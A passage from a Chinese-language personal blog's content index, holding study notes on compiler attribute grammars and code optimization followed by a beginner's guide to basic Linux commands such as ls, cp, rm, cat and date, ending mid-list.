L<sub>1</sub>.in := L.in；addtype(id.entry , L.in)；</p><h3 id="基于属性文法的处理方法"><a href="#基于属性文法的处理方法" class="headerlink" title="基于属性文法的处理方法"></a>基于属性文法的处理方法</h3><h4 id="属性计算次序"><a href="#属性计算次序" class="headerlink" title="属性计算次序"></a>属性计算次序</h4><p>拓扑排序：节点的一种顺序，是的边只会从该次序中先出现的节点到后出现的节点</p><p>①构造输入的分析树，②构造属性依赖图，③对节点进行拓扑排序，④按拓扑排序的次序计算属性。</p><p>当然，也可以多次扫描分析树，如果属性文法不存在循环依赖，每次至少会计算出一个属性值，但是编译更偏向于一边扫描的处理方法。</p><h4 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h4><ul><li><p>语法分析与语义处理阶段分离</p></li><li><p>语法分析树不适合语义处理的因素：</p><blockquote><ul><li>提取公共左因子</li><li>消除左递归等引入新的产生式和符号、标点等语法要素不含任何语义信息</li></ul></blockquote></li><li><p>抽象语法树是语法分析和后续阶段的接口</p></li></ul><h4 id="S属性文法的自下而上的计算"><a href="#S属性文法的自下而上的计算" class="headerlink" title="S属性文法的自下而上的计算"></a>S属性文法的自下而上的计算</h4><p>将LR分析器增加一个域来保存综合属性值</p><h4 id="L属性文法的自上而下的计算"><a href="#L属性文法的自上而下的计算" class="headerlink" title="L属性文法的自上而下的计算"></a>L属性文法的自上而下的计算</h4><blockquote><p>—边分析边翻译的方式能否用于继承属性</p><p>属性的计算次序一定受分析方法所限定的分析树结点建立次序的限制</p><p>分析树的节点是自左向右生成</p><p>如果属性信息是自左向右流动，那么有可能在分析的同时完成属性计算。</p></blockquote><h5 id="L属性的定义"><a href="#L属性的定义" class="headerlink" title="L属性的定义"></a>L属性的定义</h5><p>如果每个产生式 A ➡ X<sub>1</sub>X<sub>2</sub>…X<sub>n</sub> 的每条语义规则计算的属性是A的综合属性；或者X<sub>j</sub> (1≤j≤n)的继承属性，但他仅依赖①该产生式中X<sub>j</sub> 左边符号 X<sub>1</sub>X<sub>2</sub>…X<sub>j-1</sub> 的属性；②A的继承属性</p><p>变量类型声明的语法制导定义是一个L属性定义</p><p>翻译方案，例：把有加减的中缀表达式翻译成后缀表达式，如果是<code>8+5-2</code>，则输出<code>8 5 + 2 -</code></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E ➡ T R</span><br><span class="line">R ➡ addop T &#123;<span class="keyword">print</span>(addop.lexeme)&#125; R1 | ε</span><br><span class="line">T ➡ num &#123;<span class="keyword">print</span>(num.val)&#125;</span><br><span class="line"></span><br><span class="line">如 <span class="number">8</span>+<span class="number">5</span><span class="number">-2</span>可翻译成:</span><br><span class="line">4E ⇒ T R ⇒ num &#123;<span class="keyword">print</span> (<span class="number">8</span>)&#125; R</span><br><span class="line">4   ⇒ num&#123;<span class="keyword">print</span> (<span class="number">8</span>)&#125;addop T&#123;<span class="keyword">print</span> (+)&#125;R</span><br><span class="line">4   ⇒ num&#123;<span class="keyword">print</span>(<span class="number">8</span>)&#125;addop num&#123;<span class="keyword">print</span>(<span class="number">5</span>)&#125;&#123;<span class="keyword">print</span> (+)&#125;R</span><br><span class="line">4   … &#123;<span class="keyword">print</span>(<span class="number">8</span>)&#125;&#123;<span class="keyword">print</span>(<span class="number">5</span>)&#125;&#123;<span class="keyword">print</span>(+)&#125;addop T&#123;<span class="keyword">print</span>(-)&#125; R</span><br><span class="line">       … &#123;<span class="keyword">print</span>(<span class="number">8</span>)&#125;&#123;<span class="keyword">print</span>(<span class="number">5</span>)&#125;&#123;<span class="keyword">print</span>(+)&#125;&#123;<span class="keyword">print</span>(<span class="number">2</span>)&#125;&#123;<span class="keyword">print</span>(-)&#125;</span><br></pre></td></tr></table></figure><h5 id="预测翻译器的设计"><a href="#预测翻译器的设计" class="headerlink" title="预测翻译器的设计"></a>预测翻译器的设计</h5><p>把预测分析器的构造方法推广到翻译方案的实现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如:产生式R ➡ +TR | ε 的分析过程</span><br><span class="line"></span><br><span class="line">procedure R;</span><br><span class="line">4<span class="keyword">begin</span></span><br><span class="line">44<span class="keyword">if</span> lookahead = <span class="string">'+'</span> <span class="keyword">then</span> <span class="keyword">begin</span></span><br><span class="line">444<span class="keyword">match</span> (<span class="string">'+'</span>);T;R;</span><br><span class="line">44<span class="keyword">end</span></span><br><span class="line">44<span class="keyword">else</span> <span class="keyword">begin</span> <span class="comment">/*Do nothing*/</span></span><br><span class="line">4<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>语义规则的两种描述方法：属性文法和翻译方案</p><ul><li>S属性的自下而上计算（边分析便计算）</li><li>L属性的自上而下计算（边分析便计算）</li><li>L属性的自下而上计算（边分析便计算）</li></ul><h2 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h2><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p><strong>代码改进变换的原则</strong></p><ul><li><p>（1）<strong>等价原则</strong>。经过优化后不应改变程序运行的结果。</p></li><li><p>（2）<strong>有效原则</strong>。使优化后所产生的目标代码运行时间较短，占用的存储空间较小。</p></li><li><p>（3）<strong>合算原则</strong>。应尽可能以较低的代价取得较好的优化效果。</p></li></ul><p>优化：①公共子表达式删除②复写传播③死代码删除④代码外提⑤强度削弱和归纳变量删除</p><p>基本块：连续的语句序列，控制流从他的开始进入，并从他的末尾离开</p>]]></content>
      
      
      <categories>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> StudyNote </tag>
            
            <tag> Compilier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Note</title>
      <link href="/2019/08/22/Linux-Command/"/>
      <url>/2019/08/22/Linux-Command/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-Study-Note"><a href="#Linux-Study-Note" class="headerlink" title="Linux Study Note"></a>Linux Study Note</h1><blockquote><p>参考：</p><p><a href="https://www.bilibili.com/video/av23360560?from=search&amp;seid=11213656872957708813" target="_blank" rel="noopener">黑马程序员-linux从入门到精通</a></p></blockquote><h2 id="Linux系统的文件"><a href="#Linux系统的文件" class="headerlink" title="Linux系统的文件"></a>Linux系统的文件</h2><p>linux一切皆文件</p><p>文件操作种类：创建文件、编辑文件、保存文件、关闭文件、重命名文件、删除文件、恢复文件</p><h3 id="文件目录结构"><a href="#文件目录结构" class="headerlink" title="文件目录结构"></a>文件目录结构</h3><p>Bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。</p><p>Dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要<strong>挂载（类似windows下的分配盘符</strong>。</p><p>Etc：该目录主要存储一些配置文件。</p><p>Home：表示“家”，表示<strong>除了root用户以外其他用户的家目录</strong>，类似于windows下的User/用户目录。</p><p>Proc：process，表示进程，该目录中存储的是Linux运行时候的进程。</p><p>Root：该目录是root用户自己的家目录。</p><p>Sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。</p><p>Tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。</p><p>Usr：全称是User Software Resource，注意不是user的缩写。存放的是用户自己安装的软件。类似于windows下的program files。</p><p>Var：存放的程序/系统的日志文件的目录。</p><p>Mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。</p><h2 id="Linux的基本指令"><a href="#Linux的基本指令" class="headerlink" title="Linux的基本指令"></a>Linux的基本指令</h2><p>linux指令指在linux终端（命令行）中输入的内容。</p><p>一个完整的指令的标准格式：Linux通用的格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指令主体 (空格) [选项] (空格) [操作对象]</span></span><br></pre></td></tr></table></figure><p>一个指令可以包含多个选项，操作对象也可以是多个。</p><h4 id="1-ls指令"><a href="#1-ls指令" class="headerlink" title="1.ls指令"></a>1.<code>ls</code>指令</h4><p>含义：ls（list）</p><h5 id="用法1：-ls"><a href="#用法1：-ls" class="headerlink" title="用法1：#ls"></a>用法1：#ls</h5><p>含义：列出当前工作目录下的所有文件/文件夹的名称</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ls_1.png" alt></p><h5 id="用法2：-ls-路径"><a href="#用法2：-ls-路径" class="headerlink" title="用法2：#ls    路径"></a>用法2：#ls    路径</h5><p>含义：列出指定路径下的所有文件/文件夹的名称</p><p>路径分为相对路径和绝对路径</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ls_2.png" alt></p><h5 id="用法3：-ls-选项-路径"><a href="#用法3：-ls-选项-路径" class="headerlink" title="用法3：#ls    选项    路径"></a>用法3：#ls    选项    路径</h5><p>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。</p><p>常见的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ls -l 路径</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls -la 路径</span></span><br></pre></td></tr></table></figure><p>选项解释：</p><p>​         -l：表示list，表示以详细列表的形式进行展示</p><p>​         -a：表示all，显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command\ls_3.png" alt="img"></p><p>上述列表中的第一列表示文档类型，<strong>其中 “ - ” 表示改行对应的文档类型为文件，“ d ” 表示文档类型为文件夹</strong>。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ls_4.png" alt></p><p><strong>在Linux中，隐藏文档一般以 “ . ” 开头。</strong> </p><h5 id="用法4：-ls-lh-路径"><a href="#用法4：-ls-lh-路径" class="headerlink" title="用法4：#ls    -lh    路径"></a>用法4：#ls    -lh    路径</h5><p>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以<strong>可读性较高的形式显示</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ls_5.png" alt></p><p>ls列出的结果颜色说明，<strong>其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限</strong></p><h4 id="2-pwd指令"><a href="#2-pwd指令" class="headerlink" title="2.pwd指令"></a>2.<code>pwd</code>指令</h4><p>用法：#pwd                    （print working directory，打印当前工作目录）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/pwd.png" alt></p><h4 id="3-cd指令"><a href="#3-cd指令" class="headerlink" title="3.cd指令"></a>3.<code>cd</code>指令</h4><p>命令：#cd            （change directory，改变目录）</p><p>作用：用于切换当前的工作目录</p><h5 id="语法：-cd-路径"><a href="#语法：-cd-路径" class="headerlink" title="语法：#cd    路径"></a>语法：#cd    路径</h5><p>P.S. 在linux中有一个特殊符号~，用于表示当前用户的家目录</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cd_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cd_2.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cd_3.png" alt></p><h4 id="4-mkdir指令"><a href="#4-mkdir指令" class="headerlink" title="4.mkdir指令"></a>4.<code>mkdir</code>指令</h4><p>指令：mkdir        （make directory，创建目录）</p><h5 id="语法1：-mkdir-路径"><a href="#语法1：-mkdir-路径" class="headerlink" title="语法1：#mkdir    路径"></a>语法1：#mkdir    路径</h5><p>路径，可以是文件夹名称也可以是包含名称的一个完整路径</p><p>假如是文件夹名称，则在当前目录下创建该文件夹</p><h5 id="语法2：-mkdir-p-路径"><a href="#语法2：-mkdir-p-路径" class="headerlink" title="语法2：#mkdir    -p    路径"></a>语法2：#mkdir    -p    路径</h5><p>含义：<strong>当一次性创建多层不存在的目录的时候</strong>，添加-p参数，否则会报错</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/mkdir_1.png" alt></p><h5 id="语法3：-mkdir-路径1-路径2-路径3-…"><a href="#语法3：-mkdir-路径1-路径2-路径3-…" class="headerlink" title="语法3：#mkdir    路径1    路径2    路径3    …"></a>语法3：#mkdir    路径1    路径2    路径3    …</h5><p>表示一次性创建多个目录</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/mkdir_2.png" alt></p><h4 id="5-touch指令"><a href="#5-touch指令" class="headerlink" title="5.touch指令"></a>5.<code>touch</code>指令</h4><p>作用：创建文件</p><p>语法：#touch    文件路径</p><p>路径可以是直接的文件名也可以是路径</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/touch_1.png" alt></p><p>一次性创建多个文件</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/touch_2.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/touch_3.png" alt></p><h4 id="6-cp指令"><a href="#6-cp指令" class="headerlink" title="6.cp指令"></a>6.<code>cp</code>指令</h4><p>指令含义：cp        （copy，复制）</p><p>作用：复制文件/文件夹到指定位置</p><h5 id="语法：-cp-被复制的文档路径-文档被复制到的路径"><a href="#语法：-cp-被复制的文档路径-文档被复制到的路径" class="headerlink" title="语法：#cp    被复制的文档路径    文档被复制到的路径"></a>语法：#cp    被复制的文档路径    文档被复制到的路径</h5><p>简单来说就是#cp    源地址    目的地址</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cp_1.png" alt></p><p><strong>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</strong></p><p><strong>当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”（-r表示递归复制），否则目录将被忽略</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cp_2.png" alt></p><h4 id="7-mv指令"><a href="#7-mv指令" class="headerlink" title="7.mv指令"></a>7.<code>mv</code>指令</h4><p>指令含义：mv        （move，移动，剪切）</p><p>作用：移动文档到新的位置</p><h5 id="语法：-mv-需要移动的文件路径-需要保存的位置路径"><a href="#语法：-mv-需要移动的文件路径-需要保存的位置路径" class="headerlink" title="语法：#mv    需要移动的文件路径    需要保存的位置路径"></a>语法：#mv    需要移动的文件路径    需要保存的位置路径</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/mv_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/mv_2.png" alt></p><p>注：在Linux中重命名的命令也是mv，语法和移动语法一样。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/mv_3.png" alt></p><h4 id="8-rm指令"><a href="#8-rm指令" class="headerlink" title="8.rm指令"></a>8.<code>rm</code>指令</h4><p>指令含义：rm        （remove，移除，删除）</p><h5 id="语法：-rm-选项-需要移除的文件路径"><a href="#语法：-rm-选项-需要移除的文件路径" class="headerlink" title="语法：#rm    选项    需要移除的文件路径"></a>语法：#rm    选项    需要移除的文件路径</h5><p>选项：    -f：force，强制删除，不提示是否删除</p><p>​                -r：表示递归</p><p>在删除的时候如果不带选项，会提示是否删除，如果需要确认则输入“y/yes”，否则输入</p><p><strong>注意：如果在删除的时候不想频繁的确认，则可以在指令中添加选项“-f”，表示force（强制）。</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/rm_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/rm_2.png" alt></p><p>删除一个文件夹：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/rm_3.png" alt></p><p><strong>注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项。</strong></p><p>删除多个文件：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/rm_4.png" alt></p><p>删除一个目录下具有公共特性的文件，例如都以Linux开头</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/rm_5.png" alt></p><p>其中<strong>*称之为通配符，意思表示任意的字符，Linux*，则表示只要文件以Linux开头，后续字符则不管</strong>。</p><h4 id="9-vim指令"><a href="#9-vim指令" class="headerlink" title="9.vim指令"></a>9.<code>vim</code>指令</h4><p>指令：vim    （Vim是一款文本编辑器，号称编辑器之神）</p><h5 id="语法：-vim-文件路径"><a href="#语法：-vim-文件路径" class="headerlink" title="语法：#vim    文件路径"></a>语法：#vim    文件路径</h5><p>作用：可以打开一个文件，文件不存在时，可以创建该文件</p><p>vim其他用法参考本文后续。</p><h4 id="10-输出重定向"><a href="#10-输出重定向" class="headerlink" title="10.输出重定向"></a>10.输出重定向</h4><p><strong>一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。</strong></p><p>>：覆输出，会覆盖掉原先的文件内容</p><p>>&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加</p><h5 id="语法：-正常执行的指令-gt-gt-gt-文件的路径"><a href="#语法：-正常执行的指令-gt-gt-gt-文件的路径" class="headerlink" title="语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径"></a>语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径</h5><p>注意：文件可以不存在，不存在则新建</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cdx_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cdx_2.png" alt></p><h4 id="11-cat指令"><a href="#11-cat指令" class="headerlink" title="11.cat指令"></a>11.<code>cat</code>指令</h4><p>作用1：cat有直接打开一个文件的功能。</p><h5 id="语法1：-cat-文件的路径"><a href="#语法1：-cat-文件的路径" class="headerlink" title="语法1：#cat    文件的路径"></a>语法1：#cat    文件的路径</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cat_1.png" alt></p><p>作用2：cat还可以对文件惊醒合并</p><h5 id="语法2：-cat-待合并的文件路径1-待合并的文件路径2-…-文件路径n-gt-合并之后的文件路径"><a href="#语法2：-cat-待合并的文件路径1-待合并的文件路径2-…-文件路径n-gt-合并之后的文件路径" class="headerlink" title="语法2：#cat    待合并的文件路径1    待合并的文件路径2    …    文件路径n    &gt;    合并之后的文件路径"></a>语法2：#cat    待合并的文件路径1    待合并的文件路径2    …    文件路径n    &gt;    合并之后的文件路径</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/cat_2.png" alt></p><h4 id="12-df指令"><a href="#12-df指令" class="headerlink" title="12.df指令"></a>12.<code>df</code>指令</h4><p>作用：查看磁盘空间</p><h5 id="语法：-df-h"><a href="#语法：-df-h" class="headerlink" title="语法：#df    -h"></a>语法：#df    -h</h5><p>-h表示以较高可读性的形式展示大小</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/df_1.png" alt></p><h4 id="13-free指令"><a href="#13-free指令" class="headerlink" title="13.free指令"></a>13.<code>free</code>指令</h4><p>作用：查看内存使用情况</p><h5 id="语法：-free-m"><a href="#语法：-free-m" class="headerlink" title="语法：#free    -m"></a>语法：#free    -m</h5><p>-m表示以mb为单位查看</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/free_1.png" alt></p><p>剩余的真实可用的内存为1665mb。</p><p>Swap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。</p><h4 id="14-head指令"><a href="#14-head指令" class="headerlink" title="14.head指令"></a>14.<code>head</code>指令</h4><p>作用：查看一个文件的前n行，若不指定n，则默认显示前10行。</p><h5 id="语法：-head-n-文件路径"><a href="#语法：-head-n-文件路径" class="headerlink" title="语法：#head    -n    文件路径"></a>语法：#head    -n    文件路径</h5><p>n表示数字</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/head_1.png" alt></p><h4 id="15-tail指令"><a href="#15-tail指令" class="headerlink" title="15.tail指令"></a>15.<code>tail</code>指令</h4><p>作用1：查看一个文件的末n行，如果n不指定，则默认显示后10行</p><h5 id="语法：-tail-n-文件路径"><a href="#语法：-tail-n-文件路径" class="headerlink" title="语法：#tail    -n    文件路径"></a>语法：#tail    -n    文件路径</h5><p>n表示数字</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/tail_1.png" alt></p><p>作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动添加的）</p><h5 id="语法：-tail-f-文件路径"><a href="#语法：-tail-f-文件路径" class="headerlink" title="语法：#tail    -f    文件路径"></a>语法：#tail    -f    文件路径</h5><p><strong>该命令一般用于查看系统的日志比较多</strong></p><h4 id="16-less指令"><a href="#16-less指令" class="headerlink" title="16.less指令"></a>16.<code>less</code>指令</h4><p>作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车，空格键+上下方向键）查看更多</p><h5 id="语法：-less-需要查看的文件路径"><a href="#语法：-less-需要查看的文件路径" class="headerlink" title="语法：#less    需要查看的文件路径"></a>语法：#less    需要查看的文件路径</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/less_1.png" alt></p><p>退出的时候只需要按下q键</p><h4 id="17-wc指令"><a href="#17-wc指令" class="headerlink" title="17.wc指令"></a>17.<code>wc</code>指令</h4><p>作用：统计文件内容信息（包含行数、单词数、字节数）</p><h4 id="语法：-wc-lwc-需要统计的文件路径"><a href="#语法：-wc-lwc-需要统计的文件路径" class="headerlink" title="语法：#wc    -lwc    需要统计的文件路径"></a>语法：#wc    -lwc    需要统计的文件路径</h4><p>-l：表示lines，行数</p><p>-w：表示words，单词数，依照空格来判断单词数量</p><p>-c：表示bytes，字节数</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/wc_1.png" alt></p><h4 id="18-date指令"><a href="#18-date指令" class="headerlink" title="18.date指令"></a>18.<code>date</code>指令</h4><p>作用：表示操作时间日期（读取、设置）</p><h5 id="语法1：-date"><a href="#语法1：-date" class="headerlink" title="语法1：#date"></a>语法1：#date</h5><p>输出的形式：2019年8月24日    星期六    20:13:14</p><h5 id="语法2：-date-F-（等价于-date-“-Y-m-d”）"><a href="#语法2：-date-F-（等价于-date-“-Y-m-d”）" class="headerlink" title="语法2：#date    +%F    （等价于    #date    “+%Y-%m-%d”）"></a>语法2：#date    +%F    （等价于    #date    “+%Y-%m-%d”）</h5><p>输出形式：2019-08-24</p><h5 id="语法3：-date-“-F-T”-（等价于-date-“-Y-m-d-H-M-S”）"><a href="#语法3：-date-“-F-T”-（等价于-date-“-Y-m-d-H-M-S”）" class="headerlink" title="语法3：#date    “+%F  %T”    （等价于    #date    “+%Y-%m-%d    %H:%M:%S”）"></a>语法3：#date    “+%F  %T”    （等价于    #date    “+%Y-%m-%d    %H:%M:%S”）</h5><p>引号表示让“年月日与时分秒”成为一个不可分割的整体</p><p>输出的形式：2019-08-24    20:13:14</p><h5 id="语法4：-date-d-“-1-day”-“-Y-m-d-H-M-S”"><a href="#语法4：-date-d-“-1-day”-“-Y-m-d-H-M-S”" class="headerlink" title="语法4：#date    -d    “-1  day”    “+%Y-%m-%d  %H:%M:%S”"></a>语法4：#date    -d    “-1  day”    “+%Y-%m-%d  %H:%M:%S”</h5><p>用于获取之前或者之后的某个时间（备份）</p><p>符号的可选值：+（之后）、-（之前）</p><p>单位的可选值：day（天）、month（月份）、year（年）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">F：表示完整的年月日</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">T：表示完整的时分秒</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">Y：表示四位年份</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">m：表示两位月份（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">d：表示日期（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">H：表示小时（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">M：表示分钟（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">S：表示秒数（带前导0）</span></span><br><span class="line"></span><br><span class="line">(以下摘自#date --help)</span><br><span class="line"><span class="meta">  %</span><span class="bash">%一个文字的 %</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">a当前locale 的星期名缩写(例如： 日，代表星期日)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">A当前locale 的星期名全称 (如：星期日)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">b当前locale 的月名缩写 (如：一，代表一月)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">B当前locale 的月名全称 (如：一月)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">c当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">C世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">d按月计的日期(例如：01)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">D按月计的日期；等于%m/%d/%y</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">e按月计的日期，添加空格，等于%_d</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">F完整日期格式，等价于 %Y-%m-%d</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">gISO-8601 格式年份的最后两位 (参见%G)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">GISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">h等于%b</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">H小时(00-23)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">I小时(00-12)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">j按年计的日期(001-366)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">k   hour, space padded ( 0..23); same as %_H</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">l   hour, space padded ( 1..12); same as %_I</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">m   month (01..12)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">M   minute (00..59)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">n换行</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">N纳秒(000000000-999999999)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">p当前locale 下的<span class="string">"上午"</span>或者<span class="string">"下午"</span>，未知时输出为空</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">P与%p 类似，但是输出小写字母</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">r当前locale 下的 12 小时时钟时间 (如：11:11:04 下午)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">R24 小时时间的时和分，等价于 %H:%M</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">s自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">S秒(00-60)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">t输出制表符 Tab</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">T时间，等于%H:%M:%S</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">u星期，1 代表星期一</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">U一年中的第几周，以周日为每星期第一天(00-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">VISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">w一星期中的第几日(0-6)，0 代表周一</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">W一年中的第几周，以周一为每星期第一天(00-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">x当前locale 下的日期描述 (如：12/31/99)</span></span><br><span class="line"><span class="meta">  %</span><span 